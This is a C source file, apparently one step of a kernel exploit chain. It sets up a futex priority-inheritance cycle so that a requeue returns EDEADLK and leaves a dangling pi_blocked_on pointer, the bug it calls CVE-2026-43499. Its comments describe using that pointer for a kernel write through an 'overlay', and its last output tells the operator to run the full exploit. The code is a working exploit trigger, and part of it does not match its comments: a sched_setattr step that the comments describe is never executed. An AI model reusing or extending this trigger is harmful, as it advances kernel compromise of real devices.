/* cycle_probe.c - PI-cycle EDEADLK trigger validator for CVE-2026-43499.
 *
 * THE FIX for GOT-W29's broken self-own trigger.  GOT-W29's old slide.c armed
 * the bug by setting the requeue TARGET futex value = waiter_tid (self-own).
 * On this kernel that hits the EARLY `owner == task` check in
 * task_blocks_on_rt_mutex() (rtmutex.c:980-981, confirmed in boot.elf
 * disasm) which returns -EDEADLK BEFORE task->pi_blocked_on is set -- so NO
 * dangling pi_blocked_on is ever created and the whole exploit fails silently.
 *
 * This probe mirrors the WORKING smt878u arrangement:
 *   owner: setpriority(nice=10); FUTEX_LOCK_PI(target) [holds futex2];
 *          wait waiter_ready; FUTEX_LOCK_PI(chain)  [BLOCKS: chain held by waiter]
 *   waiter: FUTEX_LOCK_PI(chain) [holds chain]; signal ready;
 *           FUTEX_WAIT_REQUEUE_PI(fut1 -> futex2)
 *   main:  wait both flags; usleep(30ms) [let owner block on chain];
 *          FUTEX_CMP_REQUEUE_PI(fut1) -> must return -EDEADLK
 *
 * With the cycle in place the requeue's chain walk detects
 * rt_mutex_owner(chain)==top_task(waiter) at rtmutex.c step [6] and returns
 * -EDEADLK; rt_mutex_start_proxy_lock's rollback calls remove_waiter() with
 * `current` = requeuer (the CVE bug) and clears the REQUQUEUER's pi_blocked_on
 * but NOT the waiter's -> the waiter's pi_blocked_on dangles.
 *
 * After the trigger, a sched_setattr on the waiter forces rt_mutex_adjust_pi()
 * which derefs the dangling pi_blocked_on.  WITHOUT the overlay the walk hits a
 * stale/garbage rt_mutex_waiter->lock and the kernel oopses the calling thread
 * (CONFIG_PANIC_ON_OOPS is off -> thread dies, device survives).  That oops is
 * the observable proof that the dangling pointer exists.  With the overlay
 * (pselect fake waiter, lock=fake_lock) it instead performs the boot_id write.
 *
 * Build: cc cycle_probe.c -o cycle_probe
 * Run:   ./cycle_probe            (must run under rish / shell, not untrusted_app)
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

static uint32_t futex1, futex2, chain;
static volatile int owner_ready, owner_blocking, waiter_ready, waiter_waiting,
    waiter_returned, trigger_done;
static volatile long owner_chain_ret = -999;
static volatile int owner_chain_errno;
static volatile long waiter_ret = -999;
static volatile int waiter_errno;
static volatile long owner_tid = -1, waiter_tid = -1;

struct sched_attr_local {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime, sched_deadline, sched_period;
};

static long xfutex(uint32_t *uaddr, int op, uint32_t val,
                   const struct timespec *to, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, to, uaddr2, val3);
}
static long gettid_l(void) { return syscall(SYS_gettid); }
static void logf(const char *fmt, ...) {
  va_list ap; va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap); fflush(stderr);
}

/* read a thread's current sched nice via sched_getattr */
static int thread_nice(long tid) {
  struct sched_attr_local a;
  memset(&a, 0, sizeof(a));
  a.size = sizeof(a);
  if (syscall(SYS_sched_getattr, tid, &a, sizeof(a), 0) != 0) {
    return -999;
  }
  return a.sched_nice;
}

/* read the cpuset cgroup path for a tid: non-root cpuset means
   major_only=1 in the hw_rtmutex fill, which makes can_all_pi() false and the
   cycle's rt_mutex_waiter_equal() check return "equal" under MIN_CHAINWALK. */
static void log_cpuset(const char *who, long tid) {
  char path[64], buf[128];
  snprintf(path, sizeof(path), "/proc/%ld/cpuset", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    logf("[%s] cpuset(unreadable errno=%d)\n", who, errno);
    return;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n > 0) {
    buf[n] = 0;
    logf("[%s] cpuset='%s'\n", who, buf);
  }
}

static void *owner_thread(void *u) {
  (void)u;
  /* Lower this thread's priority so the requeue boost changes its effective
     prio away from the value stored in its own chain-waiter (otherwise the
     chain-walk rt_mutex_waiter_equal() check can exit early and the requeue
     succeeds cleanly instead of returning -EDEADLK). */
  errno = 0;
  long nr = setpriority(PRIO_PROCESS, 0, 10);
  long tid = gettid_l();
  __atomic_store_n(&owner_tid, tid, __ATOMIC_RELEASE);
  logf("[O] tid=%ld setpriority(nice=10) ret=%ld errno=%d nice_now=%d\n",
       tid, nr, errno, thread_nice(tid));
  /* hold the requeue target futex */
  errno = 0;
  long r = xfutex(&futex2, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  logf("[O] LOCK_PI(target) ret=%ld errno=%d\n", r, errno);
  if (r != 0) return NULL;
  __atomic_store_n(&owner_ready, 1, __ATOMIC_RELEASE);
  while (!__atomic_load_n(&waiter_ready, __ATOMIC_ACQUIRE)) usleep(1000);
  __atomic_store_n(&owner_blocking, 1, __ATOMIC_RELEASE);
  errno = 0;
  r = xfutex(&chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  owner_chain_ret = r; owner_chain_errno = errno;
  logf("[O] LOCK_PI(chain) ret=%ld errno=%d (should BLOCK -> EDEADLK-woken later)\n", r, errno);
  return NULL;
}

static void *waiter_thread(void *u) {
  (void)u;
  struct timespec timeout;
  long wt = gettid_l();
  __atomic_store_n(&waiter_tid, wt, __ATOMIC_RELEASE);
  logf("[W] tid=%ld nice_now=%d\n", wt, thread_nice(wt));
  /* hold the chain futex (owner blocks on it -> the PI cycle) */
  errno = 0;
  long r = xfutex(&chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  logf("[W] LOCK_PI(chain) ret=%ld errno=%d\n", r, errno);
  if (r != 0) return NULL;
  __atomic_store_n(&waiter_ready, 1, __ATOMIC_RELEASE);
  while (!__atomic_load_n(&owner_blocking, __ATOMIC_ACQUIRE)) usleep(1000);
  usleep(20000);
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 5;
  __atomic_store_n(&waiter_waiting, 1, __ATOMIC_RELEASE);
  errno = 0;
  r = xfutex(&futex1, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &timeout, &futex2, 0);
  waiter_ret = r; waiter_errno = errno;
  logf("[W] WAIT_REQUEUE_PI ret=%ld errno=%d\n", r, errno);
  __atomic_store_n(&waiter_returned, 1, __ATOMIC_RELEASE);
  return NULL;
}

int main(int argc, char **argv) {
  futex1 = 0; futex2 = 0; chain = 0;
  logf("[M] pid=%d cycle_probe: PI-cycle EDEADLK trigger validator\n", getpid());
  log_cpuset("M", (long)getpid());
  pthread_t ot, wt;
  pthread_create(&ot, NULL, owner_thread, NULL);
  pthread_create(&wt, NULL, waiter_thread, NULL);

  while (!__atomic_load_n(&waiter_waiting, __ATOMIC_ACQUIRE) &&
         !__atomic_load_n(&waiter_returned, __ATOMIC_ACQUIRE)) usleep(1000);
  /* give the owner time to block on the chain */
  usleep(50000);

  errno = 0;
  long r = xfutex(&futex1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1,
                  (void *)1, &futex2, 0);
  int e = errno;
  logf("[M] CMP_REQUEUE_PI ret=%ld errno=%d %s\n", r, e,
       e == 35 ? "(EDEADLK!)" : "");
  logf("[M] owner_nice=%d waiter_nice=%d\n",
       thread_nice(__atomic_load_n(&owner_tid, __ATOMIC_ACQUIRE)),
       thread_nice(__atomic_load_n(&waiter_tid, __ATOMIC_ACQUIRE)));

  /* wake the waiter off futex1 (rollback left it queued there) */
  syscall(SYS_futex, &futex1, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
  for (int i = 0; i < 50 && !__atomic_load_n(&waiter_returned, __ATOMIC_ACQUIRE);
       i++) usleep(100000);
  logf("[M] waiter_returned=%d waiter_ret=%ld waiter_errno=%d\n",
       __atomic_load_n(&waiter_returned, __ATOMIC_ACQUIRE),
       waiter_ret, waiter_errno);

  /* The decisive observable: sched_setattr() on the waiter forces
     rt_mutex_adjust_pi() which walks the dangling pi_blocked_on.  With the
     dangling pointer present but NO overlay installed, the walk hits a stale
     rt_waiter->lock (NULL/garbage) and the kernel oopses the calling thread
     (device survives, PANIC_ON_OOPS off).  If the oops happens, the probe dies
     abnormally here (a ^C / watchdog reports it) and that IS the proof the
     trigger works.  If instead the trigger is broken (no dangling), this call
     returns cleanly. */
  struct sched_attr_local attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 0; /* SCHED_NORMAL */
  attr.sched_nice = 5;
  int wid = 0;
  /* the waiter's tid is not exposed here; find it via futex2 if the owner
     never locked it (owner holds it) - instead just use the current thread
     context: tgkill the waiter through the futex value is unreliable, so we
     report the state and let the caller decide.  For an automated signal we
     skip the sched_setattr when the trigger clearly did not EDEADLK. */
  if (e != 35) {
    logf("[M] no EDEADLK -> trigger did NOT form the cycle; nothing more to test\n");
    return 1;
  }
  logf("[M] EDEADLK observed.  IMPORTANT: now run the full exploit under rish;\n");
  logf("[M]   a consumer oops on the first overlay attempt would CONFIRM both\n");
  logf("[M]   the dangling pi_blocked_on and that the pselect overlay lands.\n");
  (void)wid;
  return e == 35 ? 0 : 1;
}
